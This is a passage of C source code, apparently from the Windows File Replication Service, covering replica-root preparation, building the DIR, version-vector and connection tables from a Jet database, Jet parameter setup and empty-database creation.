        SetFlag(Replica->CnfFlags, CONFIG_FLAG_PRIMARY);
        ClearFlag(Replica->CnfFlags, CONFIG_FLAG_SEEDING);
    } else {
        //
        // Not Primary and has partners (either now or in the past).
        //
        if (NumberOfPartners > 0) {
            ClearFlag(Replica->CnfFlags, CONFIG_FLAG_PRIMARY);

            SetFlag(Replica->CnfFlags, CONFIG_FLAG_SEEDING);
        } else {
            //
            // Not primary but NO PARTNERS in the past so if no connections
            // then we will preload the IDTable by setting PRIMARY.
            //
             if (NumOfCxtions == 0) {
                SetFlag(Replica->CnfFlags, CONFIG_FLAG_PRIMARY);
            } else {
                ClearFlag(Replica->CnfFlags, CONFIG_FLAG_PRIMARY);
            }
            ClearFlag(Replica->CnfFlags, CONFIG_FLAG_SEEDING);
        }
    }

    //
    // Unshare SYSVOL if needed
    //
    if (FRS_RSTYPE_IS_SYSVOL(Replica->ReplicaSetType)) {
        RcsSetSysvolReady(0);
        if (BooleanFlagOn(Replica->CnfFlags, CONFIG_FLAG_PRIMARY)) {
            EPRINT1(EVENT_FRS_SYSVOL_NOT_READY_PRIMARY_2, ComputerName);
        } else {
            EPRINT1(EVENT_FRS_SYSVOL_NOT_READY_2, ComputerName);
        }
    }

    DPRINT5(4, "++ DONE Recreating %ws\\%ws; %d Reg, %d Ds, %08x CnfFlags\n",
            Replica->SetName->Name, Replica->MemberName->Name,
            NumberOfPartners, NumOfCxtions, Replica->CnfFlags);


    //
    // Move over preexisting files
    //

MOVE_PREEXISTING_FILES:

    if (!BooleanFlagOn(Replica->CnfFlags, CONFIG_FLAG_PRIMARY)) {
        //
        // Create the preexisting directory (continue on error)
        //
        if (!CreateDirectory(PreExistingPath, NULL)) {
            WStatus = GetLastError();
            if (!WIN_SUCCESS(WStatus) && !WIN_ALREADY_EXISTS(WStatus)) {
                DPRINT1_WS(3, "++ ERROR - CreateDirecotry(%ws); ", PreExistingPath, WStatus);
                goto CLEANUP;
            }
        } else {
            NewlyCreated = TRUE;
        }

        //
        // Restrict access if the directory was just created. We need to do that
        // to avoid journal wrap caused by recursice ACL stamping on the
        // preinstall directory. Look at how SetSecurityInfo works.
        //
        if (NewlyCreated == TRUE) {
            WStatus = FrsRestrictAccessToFileOrDirectory(PreExistingPath, NULL,
                                                     FALSE, // do not inherit acls from parent.
                                                     FALSE);// do not push acls to children.

            if (!WIN_SUCCESS(WStatus)) {
                DPRINT1_WS(0, "++ ERROR - FrsRestrictAccessToFileOrDirectory(%ws);",
                        PreExistingPath, WStatus);
                goto CLEANUP;
            }
        }

        //
        // Open the root path.
        // Always open the replica root by masking off the FILE_OPEN_REPARSE_POINT flag
        // because we want to open the destination dir not the junction if the root
        // happens to be a mount point.
        //
        WStatus = FrsOpenSourceFileW(&RootHandle,
                                     Replica->Root,
//                                     READ_ACCESS,
                                     READ_ATTRIB_ACCESS | WRITE_ATTRIB_ACCESS | FILE_LIST_DIRECTORY,
                                     OPEN_OPTIONS & ~FILE_OPEN_REPARSE_POINT);
        CLEANUP1_WS(0, "ERROR - FrsOpenSourceFile(%ws); ",
                    Replica->Root, WStatus, CLEANUP);

        //
        // Enumerate the directory (continue on error).
        // The children of the exisitng root dir are renamed into the
        // pre-existing dir instead of just renaming the existing root dir.
        // This preserves the ACL, alternate data streams, etc, on
        // the root dir.  Could have done a backup/restore sequence on the
        // root dir but that is a lot of work too.
        //
        PreExisting.MovedAFile      = FALSE;
        PreExisting.RootPath        = Replica->Root;
        PreExisting.PreExistingPath = PreExistingPath;

        WStatus = FrsEnumerateDirectory(RootHandle,
                                        Replica->Root,
                                        0,
                                        ENUMERATE_DIRECTORY_FLAGS_ERROR_CONTINUE,
                                        &PreExisting,
                                        DbsEnumerateDirectoryPreExistingWorker);
        DPRINT1_WS(3, "++ WARN - FrsMoveExisting(%ws);", PreExistingPath, WStatus);

        //
        // Delete the preexisting directory if no files were moved
        //
        if (!PreExisting.MovedAFile) {
            WStatus = FrsDeletePath(PreExistingPath,
                                    ENUMERATE_DIRECTORY_FLAGS_ERROR_CONTINUE);
            if (!WIN_SUCCESS(WStatus)) {
                DPRINT1_WS(3, "++ WARN - FrsDeletePath(%ws);", PreExistingPath,  WStatus);
                goto CLEANUP;
            }
            DPRINT3(4, "++ DID NOT move files from %ws for %ws\\%ws\n",
                    Replica->Root, Replica->SetName->Name, Replica->MemberName->Name);
        } else {
            EPRINT2(EVENT_FRS_MOVED_PREEXISTING, Replica->Root, PreExistingPath);
            DPRINT3(4, "++ Moved files from %ws for %ws\\%ws\n",
                    Replica->Root, Replica->SetName->Name, Replica->MemberName->Name);
        }
    }

    //
    // DONE
    //
    WStatus = ERROR_SUCCESS;

CLEANUP:

    FRS_CLOSE(RootHandle);

    FrsFree(PreInstallPath);
    FrsFree(PreExistingPath);
    DPRINT3_WS(4, "++ DONE Preparing root %ws for %ws\\%ws; ",
               Replica->Root, Replica->SetName->Name, Replica->MemberName->Name, WStatus);

    if (!WIN_SUCCESS(WStatus)) {
        EPRINT1(EVENT_FRS_PREPARE_ROOT_FAILED, Replica->Root);
    }

    return WStatus;
}


JET_ERR
DbsBuildDirTable(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    IDTableCtx,
    IN PTABLE_CTX    DIRTableCtx
    )

/*++

Routine Description:

    This function opens the tables specified by the table context
    (if they are not already open) and builds the DIRTable contents by
    scanning the IDTable for directory entries.

    If the TableCtx->Tid field is NOT JET_tableidNil then
    we assume it is good FOR THIS SESSION and do not reopen the table.

    Note:  NEVER use table IDs across sessions or threads.

Arguments:

    ThreadCtx  - Provides the Jet Sesid and Dbid.

    IDTableCtx   - The ID table context providing the data uses the following:

            JTableCreate - The table create structure which provides info
                           about the columns that were created in the table.

            JRetColumn - The JET_RETRIEVECOLUMN struct array to tell
                         Jet where to put the data.

            ReplicaNumber - The id number of the replica this table belongs too.


    DIRTableCtx   - The DIR table context to load:

            JTableCreate - The table create structure which provides info
                           about the columns that were created in the table.

            JSetColumn - The JET_SETCOLUMN struct array to tell
                         Jet where to get the data.

            ReplicaNumber - The id number of the replica this table belongs too.

PERF COMMENTS:

    Two things can be done to make this more efficient.

    1. Build a special IDTable JET_RETRIEVECOLUMN struct to only pull the necessary
       fields from the IDTable record.

    2. Point the addresses in the DIRTable JET_SETCOLUMN struct to the fields in the
       IDTable JET_RETRIEVECOLUMN struct and avoid the copy.


Return Value:

    Jet Error Status.  If we encounter an error the tables are closed and
    the error status is returned.  Return JET_errSuccess if all OK.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsBuildDirTable:"

    JET_ERR    jerr, jerr1;
    JET_SESID  Sesid;
    NTSTATUS   Status;
    ULONG      ReplicaNumber;

    JET_TABLEID IDTid;
    CHAR        IDTableName[JET_cbNameMost];

    JET_TABLEID DIRTid;
    CHAR        DIRTableName[JET_cbNameMost];
    JET_TABLEID FrsOpenTableSaveTid;   // for FrsOpenTableMacro DEBUG




    Sesid          = ThreadCtx->JSesid;
    ReplicaNumber  = IDTableCtx->ReplicaNumber;


    //
    // Open the ID table, if not already open. Check the session id for match.
    //
    jerr = DBS_OPEN_TABLE(ThreadCtx, IDTableCtx, ReplicaNumber, IDTableName, &IDTid);
    CLEANUP1_JS(0, "FrsOpenTable (%s) :", IDTableName, jerr, ERROR_RET_TABLE);

    //
    // Open the DIR Table, if not already open. Check the session id for match.
    //
    jerr = DBS_OPEN_TABLE(ThreadCtx, DIRTableCtx, ReplicaNumber, DIRTableName, &DIRTid);
    CLEANUP1_JS(0, "FrsOpenTable (%s) :", DIRTableName, jerr, ERROR_RET_TABLE);

    //
    // Initialize the JetSet/RetCol arrays and data record buffer addresses
    // to write the fields of the DIRTable records from the DIRTableRec.
    //
    DbsSetJetColSize(DIRTableCtx);
    DbsSetJetColAddr(DIRTableCtx);

    //
    // Allocate the storage for the variable length fields in the record and
    // update the JetSet/RetCol arrays appropriately.
    //
    Status = DbsAllocRecordStorage(DIRTableCtx);
    CLEANUP_NT(0, "ERROR - DbsAllocRecordStorage failed to alloc buffers.",
               Status, ERROR_RET_TABLE);

    //
    // Scan thru the IDTable by the FileGuidIndex calling
    // DbsBuildDirTableWorker() for each record to make entires in the DIRTable.
    //

    jerr = FrsEnumerateTable(ThreadCtx,
                             IDTableCtx,
                             GuidIndexx,
                             DbsBuildDirTableWorker,
                             DIRTableCtx);

    //
    //  We're done.  Return success if we made it to the end of the ID Table.
    //
    if (jerr == JET_errNoCurrentRecord ) {
        return JET_errSuccess;
    } else {
        return jerr;
    }

    //
    // Error return paths
    //

ERROR_RET_TABLE:

    //
    // Close the tables and reset TableCtx Tid and Sesid.   Macro writes 1st arg.
    //
    DbsCloseTable(jerr1, Sesid, IDTableCtx);
    DbsCloseTable(jerr1, Sesid, DIRTableCtx);

    return jerr;

}



JET_ERR
DbsBuildDirTableWorker(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN PVOID         Record,
    IN PVOID         Context
)
/*++

Routine Description:

    This is a worker function passed to FrsEnumerateTable().  Each time
    it is called it checks if the IDTable record is for a directory and
    if so, writes a DIRTable record.  The caller of FrsEnumerateTable()
    has opened the DIRTable and passed the DIRTableCtx thru the Context
    argument.

Arguments:

    ThreadCtx - Needed to access Jet.
    TableCtx  - A ptr to an IDTable context struct.
    Record    - A ptr to a IDTable record.
    Context   - A ptr to a DIRTable context struct.

Thread Return Value:

    A Jet error status.  Success means call us with the next record.
    Failure means don't call again and pass our status back to the
    caller of FrsEnumerateTable().

--*/
{
#undef DEBSUB
#define DEBSUB "DbsBuildDirTableWorker:"

    JET_ERR jerr;

    PTABLE_CTX  DIRTableCtx = (PTABLE_CTX) Context;

    PDIRTABLE_RECORD DIRTableRec = (PDIRTABLE_RECORD) (DIRTableCtx->pDataRecord);

    PIDTABLE_RECORD IDTableRec = (PIDTABLE_RECORD) Record ;

    //
    // Abort the enum if the service is stopping.
    //
    if (FrsIsShuttingDown) {
        return JET_errTermInProgress;
    }

    //
    // Include the record if the file is a directory, replication is enabled
    // on the directory and the directory is not deleted or was
    // a new file in progress when the system last went down.
    // If its marked for deletion we want it in the dirtable.
    //
    if (IDTableRec->FileIsDir) {

        //
        // Build the DIRTable record.
        //
        DIRTableRec->DFileGuid      = IDTableRec->FileGuid;
        DIRTableRec->DFileID        = IDTableRec->FileID;
        DIRTableRec->DParentFileID  = IDTableRec->ParentFileID;
        DIRTableRec->DReplicaNumber = DIRTableCtx->ReplicaNumber;

        wcsncpy(DIRTableRec->DFileName, IDTableRec->FileName, MAX_PATH + 1);
        DIRTableRec->DFileName[MAX_PATH] = L'\0';

        if (IsIdRecFlagSet(IDTableRec, IDREC_FLAGS_NEW_FILE_IN_PROGRESS) ||
            !IDTableRec->ReplEnabled ||
            (IsIdRecFlagSet(IDTableRec, IDREC_FLAGS_DELETED) &&
             !IsIdRecFlagSet(IDTableRec, IDREC_FLAGS_DELETE_DEFERRED))) {

            //
            // Clean up the DIR Table so we keep bogus entries out of the
            // journal's parent file ID and the Filter Tables
            //
            jerr = DbsDeleteRecord(ThreadCtx,
                                   (PVOID) &DIRTableRec->DFileGuid,
                                   DFileGuidIndexx,
                                   DIRTableCtx);
            DPRINT_JS(3, "WARNING - Dir table record delete failed:", jerr);
        } else {

            //
            // Now insert the DIR Table record.
            //
            jerr = DbsInsertTable2(DIRTableCtx);
            DPRINT_JS(3, "WARNING - Dir table record insert error:", jerr);
        }
    }

    //
    // Return success so we can keep going thru the ID table.
    //
    return JET_errSuccess;
}



JET_ERR
DbsBuildVVTableWorker(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN PVOID         Record,
    IN PVOID         Context
)
/*++

Routine Description:

    This is a worker function passed to FrsEnumerateTable().  Each time
    it is called it inserts a copy of the record from the VVTable into
    the generic table addressed by Context.

Arguments:

    ThreadCtx - Needed to access Jet.
    TableCtx  - A ptr to an VVTable context struct.
    Record    - A ptr to a VVTable record.
    Context   - A ptr to a generic table

Thread Return Value:

    JET_errSuccess

--*/
{
#undef DEBSUB
#define DEBSUB "DbsBuildVVTableWorker:"

    PREPLICA        Replica     = (PREPLICA)Context;
    PVVTABLE_RECORD VVTableRec  = (PVVTABLE_RECORD)Record;

    //
    // Insert the version into the replica's version vector
    //
    DPRINT2(4, "Enumerating VV for %08x %08x OutlogVsn - %08x %08x\n",
           PRINTQUAD(VVTableRec->VVOriginatorVsn),PRINTQUAD(VVTableRec->VVOutlogOriginatorVsn));
    VVUpdate(Replica->VVector, VVTableRec->VVOriginatorVsn, &VVTableRec->VVOriginatorGuid);
    if (VVTableRec->VVOutlogOriginatorVsn == QUADZERO) {
        VVUpdate(Replica->OutlogVVector, VVTableRec->VVOriginatorVsn, &VVTableRec->VVOriginatorGuid);
    } else {
        VVUpdate(Replica->OutlogVVector, VVTableRec->VVOutlogOriginatorVsn, &VVTableRec->VVOriginatorGuid);
    }
    //
    // Return success so we can keep going thru the VV table.
    //
    return JET_errSuccess;
}


VOID
DbsCopyCxtionRecordToCxtion(
    IN PTABLE_CTX   TableCtx,
    IN PCXTION      Cxtion
    )
/*++

Routine Description:

    Copy the cxtion record fields into the cxtion

Arguments:

    TableCtx
    Cxtion

Thread Return Value:

    None.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsCopyCxtionRecordToCxtion:"
    POUT_LOG_PARTNER    OutLogPartner;
    PCXTION_RECORD      CxtionRecord = TableCtx->pDataRecord;


    //
    // Update the in memory structure
    //

    //
    // Cxtion Name
    //
    Cxtion->Name = FrsBuildGName(FrsDupGuid(&CxtionRecord->CxtionGuid),
                                 FrsWcsDup(CxtionRecord->CxtionName));
    if (!Cxtion->Name->Name) {
        DPRINT(0, "ERROR - Cxtion's name is NULL!\n");
        Cxtion->Name->Name = FrsWcsDup(L"<unknown>");
    }
    //
    // Partner Name
    //
    Cxtion->Partner = FrsBuildGName(FrsDupGuid(&CxtionRecord->PartnerGuid),
                                    FrsWcsDup(CxtionRecord->PartnerName));
    if (!Cxtion->Partner->Name) {
        DPRINT1(0, "ERROR - %ws: Cxtion's partner's name is NULL!\n",
                Cxtion->Name->Name);
        Cxtion->Partner->Name = FrsWcsDup(L"<unknown>");
    }

    //
    // Partner DNS Name
    //
    Cxtion->PartnerDnsName = FrsWcsDup(CxtionRecord->PartnerDnsName);
    if (!Cxtion->PartnerDnsName) {
        DPRINT1(0, "ERROR - %ws: Cxtion's PartnerDnsName is NULL!\n",
                Cxtion->Name->Name);
        Cxtion->PartnerDnsName = FrsWcsDup(Cxtion->Partner->Name);
    }

    //
    // Partner server name
    //
    Cxtion->PartSrvName = FrsWcsDup(CxtionRecord->PartSrvName);
    if (!Cxtion->PartSrvName) {
        DPRINT1(0, "ERROR - %ws: Cxtion's PartSrvName is NULL!\n",
                Cxtion->Name->Name);
        Cxtion->PartSrvName = FrsWcsDup(L"<unknown>");
    }

    //
    // Parnter PrincName
    //
    DbsUnPackStrW(&Cxtion->PartnerPrincName, CrPartnerPrincNamex, TableCtx);
    if (!Cxtion->PartnerPrincName) {
        DPRINT1(0, "ERROR - %ws: Cxtion's PartnerPrincName is NULL!\n",
                Cxtion->Name->Name);
        Cxtion->PartnerPrincName = FrsWcsDup(L"<unknown>");
    }

    //
    // Parnter SID
    //
    DbsUnPackStrW(&Cxtion->PartnerSid, CrPartnerSidx, TableCtx);
    if (!Cxtion->PartnerSid) {
        DPRINT1(0, "ERROR - %ws: Cxtion's PartnerSid is NULL!\n",
                Cxtion->Name->Name);
        Cxtion->PartnerSid = FrsWcsDup(L"<unknown>");
    }

    //
    // Partner Auth Level
    //
    Cxtion->PartnerAuthLevel = CxtionRecord->PartnerAuthLevel;

    //
    // Inbound
    //
    Cxtion->Inbound = CxtionRecord->Inbound;

    //
    // LastJoinTime
    //
    COPY_TIME(&Cxtion->LastJoinTime, &CxtionRecord->LastJoinTime);

    //
    // Schedule
    //
    DbsUnPackSchedule(&Cxtion->Schedule, CrSchedulex, TableCtx);
    DBS_DISPLAY_SCHEDULE(4, L"Schedule unpacked for Cxtion:", Cxtion->Schedule);


    Cxtion->TerminationCoSeqNum = CxtionRecord->TerminationCoSeqNum;

    //
    // Cxtion Flags
    // High short belongs to cxtion
    //
    Cxtion->Flags &= ~CXTION_FLAGS_CXTION_RECORD_MASK;
    Cxtion->Flags |= (CxtionRecord->Flags & CXTION_FLAGS_CXTION_RECORD_MASK);

    //
    // Cxtion options.
    //
    Cxtion->Options = CxtionRecord->Options;
    Cxtion->Priority = FRSCONN_GET_PRIORITY(Cxtion->Options);

    //
    // OUT LOG PARTNER
    //
    if (Cxtion->Inbound) {
        return;
    }
    Cxtion->OLCtx = FrsAllocType(OUT_LOG_PARTNER_TYPE);
    OutLogPartner = Cxtion->OLCtx;
    OutLogPartner->Cxtion = Cxtion;
    //
    // Low short belongs to outlogpartner
    //
    OutLogPartner->Flags &= ~OLP_FLAGS_CXTION_RECORD_MASK;
    OutLogPartner->Flags |= (CxtionRecord->Flags & OLP_FLAGS_CXTION_RECORD_MASK);
    OutLogPartner->COLx = CxtionRecord->COLx;
    OutLogPartner->COTx = CxtionRecord->COTx;
    OutLogPartner->COTxNormalModeSave = CxtionRecord->COTxNormalModeSave;
    OutLogPartner->COTslot = CxtionRecord->COTslot;
    OutLogPartner->OutstandingQuota = MaxOutLogCoQuota;  //CxtionRecord->OutstandingQuota
    CopyMemory(OutLogPartner->AckVector, CxtionRecord->AckVector, ACK_VECTOR_BYTES);

    //
    // Schedule
    //
    DbsUnPackSchedule(&Cxtion->Schedule, CrSchedulex, TableCtx);
    DBS_DISPLAY_SCHEDULE(4, L"Schedule unpacked for Cxtion:", Cxtion->Schedule);
}


JET_ERR
DbsBuildCxtionTableWorker(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN PVOID         Record,
    IN PVOID         Context
)
/*++

Routine Description:

    This is a worker function passed to FrsEnumerateTable().  Each time
    it is called it inserts a copy of the record from the CxtionTable
    into the generic table addressed by Context.

Arguments:

    ThreadCtx - Needed to access Jet.
    TableCtx
    Record
    Context -- Pointer to the replica structure.

Thread Return Value:

    JET_errSuccess

--*/
{
#undef DEBSUB
#define DEBSUB "DbsBuildCxtionTableWorker:"

    PCXTION        Cxtion;
    ULONG          NameLen;
    PWCHAR         CxNamePtr;
    PREPLICA       Replica = (PREPLICA)Context;
    PGEN_TABLE     Cxtions = (PGEN_TABLE)Replica->Cxtions;

    DBS_DISPLAY_RECORD_SEV(5, TableCtx, TRUE);
    //
    // Copy the cxtion record into a cxtion structure
    //
    Cxtion = FrsAllocType(CXTION_TYPE);
    DbsCopyCxtionRecordToCxtion(TableCtx, Cxtion);

    //
    // Insert the version into the replica's version vector
    //
    DPRINT2(4, "Enumerating Cxtion %ws -> %ws\n",
            Cxtion->Name->Name, Cxtion->Partner->Name);

    RcsCheckCxtionSchedule(Replica, Cxtion);
    SetCxtionState(Cxtion, CxtionStateUnjoined);
    GTabInsertEntry(Cxtions, Cxtion, Cxtion->Name->Guid, NULL);

    //
    // Set the OID data structure which is a part of the counter data structure
    // stored in the hash table.  Add ReplicaConn Instance to the registry
    //
    DPRINT(4, "PERFMON:Adding Connection:CREATEDB.C:1\n");
    RcsCreatePerfmonCxtionName(Replica, Cxtion);

    //
    // Return success so we can keep going thru the VV table.
    //
    return JET_errSuccess;
}


JET_ERR
DbsInlogScanWorker(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN PVOID         Record,
    IN PVOID         Context
)
/*++

Routine Description:

    This is a worker function passed to FrsEnumerateTable().  Each time
    it is called it processes a record from the Inbound log table.

    It scans the inbound log table counting the number of retry change orders,
    the max USN on any local change order and it reconstructs the version vector
    retire list for those change orders that don't have VVExec set.

Arguments:

    ThreadCtx - Needed to access Jet.
    TableCtx  - A ptr to an inbound log context struct.
    Record    - A ptr to a change order command record.
    Context   - A ptr to the Replica struct we are working on.

Thread Return Value:

    JET_errSuccess if enum is to continue.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsInlogScanWorker:"

    PREPLICA              Replica = (PREPLICA) Context;
    PCHANGE_ORDER_COMMAND CoCmd = (PCHANGE_ORDER_COMMAND)Record;


    DBS_DISPLAY_RECORD_SEV(4, TableCtx, TRUE);

    //
    // Reconstruct the CO retry count.
    //
    Replica->InLogRetryCount += 1;

    //
    // Find largest (most recent) local journal Usn.  Recovery can only
    // advance to the FirstUsn record that may be combined into a single
    // change order with others.  If we advanced to the last USN record
    // contributing to this change order we could skip over intervening
    // USN records for other files in the replica tree that could not be
    // combined with this change order.  Then if we crashed after this
    // change order made it to the inbound log but before those others made it
    // we would end up skipping them.
    //
    // NOTE - as it stands now we could end up reprocessing USN records for
    // file operations that had already been combined into this change order.
    //
    //
    if (BooleanFlagOn(CoCmd->Flags, CO_FLAG_LOCALCO)) {
        if (Replica->JrnlRecoveryStart < CoCmd->JrnlFirstUsn) {
            Replica->JrnlRecoveryStart = CoCmd->JrnlFirstUsn;
        }
    }

    return JET_errSuccess;
}


VOID
DbsExitIfDiskFull (
    IN JET_ERR  jerr
    )
/*++

Routine Description:

    Shutdown the service if the disk is full.

Arguments:

    jerr    - JET error status

Return Value:

    None.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsExitIfDiskFull:"

    ULONG                FStatus;

    //
    // Shutdown if the database volume is full
    //
    if (jerr == JET_errDiskFull || jerr == JET_errLogDiskFull) {
        DPRINT1(0, "ERROR - Disk is full on %ws; shutting down\n", WorkingPath);
        EPRINT2(EVENT_FRS_DATABASE_SPACE, ComputerName, WorkingPath);
        //
        // exit and allow the service controller to restart us
        //
        FrsSetServiceStatus(SERVICE_STOPPED,
                            0,
                            DEFAULT_SHUTDOWN_TIMEOUT * 1000,
                            ERROR_NO_SYSTEM_RESOURCES);

        DEBUG_FLUSH();

        exit(ERROR_NO_SYSTEM_RESOURCES);
    }
}

JET_ERR
DbsInitJet(
    JET_INSTANCE  *JInstance
    )
/*++

Routine Description:

    This function sets up global Jet Params and calls JetInit().

Arguments:

    JInstance - ptr to JET_INSTSANCE Context.

Return Value:

    Jet status code.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsInitJet:"

    JET_ERR    jerr;
    ULONG  MaxOpenTables;
    ULONG  CacheSizeMin;

    //
    // Initialize jet directories
    //
    strcpy(JetSystemParamsDef.ChkPointFilePath, JetSysA);
    strcpy(JetSystemParamsDef.TempFilePath, JetTempA);
    strcpy(JetSystemParamsDef.LogFilePath, JetLogA);

    //
    // Initialize Jet.
    //
    jerr = JetSetSystemParameter(JInstance, 0, JET_paramSystemPath, 0, JetSysA);
    CLEANUP_JS(0, "ERROR - JetSetSystemParameter(JET_paramSystemPath):", jerr, ERROR_RET_NOJET);

    jerr = JetSetSystemParameter(JInstance, 0, JET_paramTempPath, 0, JetTempA);
    CLEANUP_JS(0, "ERROR - JetSetSystemParameter(JET_paramTempPath):", jerr, ERROR_RET_NOJET);

    jerr = JetSetSystemParameter(JInstance, 0, JET_paramLogFilePath, 0, JetLogA);
    CLEANUP_JS(0, "ERROR - JetSetSystemParameter(JET_paramLogFilePath):", jerr, ERROR_RET_NOJET);

    jerr = JetSetSystemParameter(JInstance, 0, JET_paramCircularLog, 1, NULL);
    DPRINT_JS(0, "WARN - JetSetSystemParameter(JET_paramCircularLog):", jerr);

    //
    // [below is from Jet Development]
    //
    // JET_paramEnableIndexChecking is changed (Oct/01) to default to false.
    // The app must now explicitly set it.
    //
    // GetNLSVersion is LoadLibrary'd from kernel32.dll to get the sort-order
    // for a particular LCID.  The sort-order for an index is persisted in the
    // database catalog.
    // Dump the meta-data (ESENTUTL /MM database /V with a checked build)
    // to see the sort order.
    //
    // If JET_paramEnableIndexChecking is set and the OS version changes
    // (major, minor, build or service pack), databases will have their
    // indexes checked at attach time.  Any indexes on Unicode columns are
    // checked to see if their sort-order has changed.
    //
    // During index checking:
    //
    //     Any change in sort-order (version or defined version) will result
    //     in the index being considered "out-of-date"
    //
    //     Indexes with no sort-order are always considered "out-of-date"
    //
    //     If JET_bitDbDeleteCorruptedIndexes is passed into JetAttachDatabase
    //     the "out-of-date" indexes are deleted.  The database attach returns
    //     a warning, indicating that indexes were deleted. It is up to the
    //     application to rebuild the indexes.
    //     Otherwise the database attach will fail due to:
    //        The database is not attached with the JET_bitDbDeleteCorruptIndexes flag
    //        The out-of-date index is a clustered index
    //        The out-of-date index is an inherited index,
    //        or the table is a template table (FixDDL, TRUE for FRS).
    //
    // If you do not set JET_paramEnableIndexChecking, nothing will happen at
    // database attach time. If any of the indexed unicode characters have
    // had their sorting changed the index will be corrupt and will eventually
    // generate a Jet runtime error during a seek or update.
    //
    // [end of Jet Development comment]
    //
    //
    // Starting with whistler Jet stopped checking for changes in sort orders with
    // build changes.  Since jet can't delete the corrupt index on a database
    // created with FixedDDL JET_bitDbDeleteCorruptedIndexes won't work.  We need
    // the error return  JET_errSecondaryIndexCorrupted  to trigger an index
    // rebuild via esentutl.  Need to turn on JET_paramEnableIndexChecking to get
    // this.  In Win2K it was on by default.
    //
    jerr = JetSetSystemParameter(JInstance, 0, JET_paramEnableIndexChecking, 1, NULL);
    DPRINT_JS(0, "WARN - JetSetSystemParameter(JET_paramEnableIndexChecking):", jerr);

    //
    // Increase the maximum number of open tables that Jet will allow.
    //
    MaxOpenTables = MaxNumberReplicaSets * NUMBER_JET_TABLES_PER_REPLICA_SET;
    jerr = JetSetSystemParameter(JInstance, 0, JET_paramMaxOpenTables,
                                 MaxOpenTables, NULL);
    DPRINT_JS(0, "WARN - JetSetSystemParameter(JET_paramMaxOpenTables):", jerr);

    //
    // Increase the number of open database sessions.
    // JET_paramMaxSessions        maximum number of sessions [128]
    // Needed with lots of outbound partners doing lots of concurrent VVJoins.
    //
    jerr = JetSetSystemParameter(JInstance, 0, JET_paramMaxSessions,
                                 MaxNumberJetSessions, NULL);
    DPRINT_JS(0, "++ WARN - JetSetSystemParameter(JET_paramMaxSessions):", jerr);

    //
    // Increase the number of table cursors based on the number of tables.
    // JET_paramMaxCursors
    //
    jerr = JetSetSystemParameter(JInstance, 0, JET_paramMaxCursors,
                                 MaxOpenTables * 2, NULL);
    DPRINT_JS(0, "++ WARN - JetSetSystemParameter(JET_paramMaxCursors):", jerr);

    //
    //  JET_paramCacheSizeMin must be at lease 4 times JET_paramMaxSessions
    //  or JetInit will fail.
    //
    CacheSizeMin = max(4 * MaxNumberJetSessions, 64);
    jerr = JetSetSystemParameter(JInstance, 0, JET_paramCacheSizeMin,
                                 CacheSizeMin, NULL);
    CLEANUP_JS(0, "++ WARN - JetSetSystemParameter(JET_paramCacheSizeMin):", jerr, ERROR_RET_NOJET);


//#define JET_paramCacheSizeMin           60  /* minimum cache size in pages [64] */
//#define JET_paramCacheSize              41  /* current cache size in pages [512] */
//#define JET_paramCacheSizeMax           23  /* maximum cache size in pages [512] */



    DPRINT1(1, ":S: calling JetInit with %s \n", JetFileA);
    jerr = JetInit(JInstance);
    DPRINT1_JS(0, "++ ERROR - JetInit with %s :", JetFileA, jerr);

ERROR_RET_NOJET:

    return jerr;
}



JET_ERR
DbsCreateEmptyDatabase(
    PTHREAD_CTX ThreadCtx,
    PTABLE_CTX TableCtx
    )
/*++

Routine Description:

    This function controls the creation of the initial database.
    This includes creation of the config table and the initial
    configuration record <init>.  At completion it closes the database,
    terminates the Jet Session and makes a backup copy in NEWFRS.JDB.

Arguments:

    ThreadCtx -- A Thread context to use for dbid and sesid.

    TableCtx  -- The table context struct which contains:

                RecordBase - The base address of the record buffer to
                             read/write from/to jet.

                JTableCreate - The table create structure which provides info
                               about the columns that were created in the table.

Return Value:

    Jet Error Status

--*/
{
#undef DEBSUB
#define DEBSUB  "DbsCreateEmptyDatabase:"
    JET_INSTANCE JInstance = JET_instanceNil;
    JET_SESID    Sesid;
    JET_DBID     Dbid;
    JET_TABLEID  ConfigTid;
    JET_ERR      jerr      = JET_errSuccess;
    JET_ERR      jerr1     = JET_errSuccess;
    ULONG        i;
    ULONG        MaxOpenTables;
    NTSTATUS     Status;
    PCONFIG_TABLE_RECORD ConfigRecord;
    PJET_TABLECREATE     JTableCreate;
    GUID                 ReplicaMemberGuid;

    JET_TABLECREATE      TableCreate;
    CHAR                 TableName[JET_cbNameMost];


#define UNUSED_JET_szPARAM ""

    DPRINT1(0, "Creating empty Database Structure: %s\n", JetFileA);


    //
    // Get the Table Create struct for the config table to create.
    //
    JTableCreate = TableCtx->pJetTableCreate;

    //
    // Initialize Jet returning the handle.
    //
    jerr = DbsInitJet(&JInstance);
    CLEANUP_JS(0, "ERROR - DbsInitJet failed:", jerr, ERROR_RET_NOJET);

    ThreadCtx->JInstance = JInstance;

    //
    // Setup a Jet Session returning the session ID.
    // The last 2 params are username and password.
    //
    jerr = JetBeginSession(JInstance, &Sesid, NULL, NULL);
    CLEANUP1_JS(0, "++ ERROR - JetBeginSession with %s :", JetFileA, jerr, ERROR_RET_TERM);

    TableCtx->Sesid = Sesid;
    ThreadCtx->JSesid = Sesid;

    //
    // Create the database returning the database handle.  Do this with recovery
    // off to make it go faster.  Then when the DB is later detached and
    // reattached recovery is reenabled.  Note that the global param,
    // JET_paramRecovery turns recovery off for the Jet Runtime system
    // (process state) and would need to be explicitly turned back on.
    //
    jerr = JetCreateDatabase(Sesid, JetFileA, UNUSED_JET_szPARAM, &Dbid, 0);
    CLEANUP1_JS(0, "++ ERROR - JetCreateDatabase(%s) :", JetFileA, jerr, ERROR_RET_SESSION);

    ThreadCtx->JDbid = Dbid;

    //
    // Create the config table and save in the Table context.
    //
    jerr = DbsCreateJetTable(ThreadCtx, JTableCreate);
    CLEANUP1_JS(0, "++ ERROR - DbsCreateJetTable(%s) :",
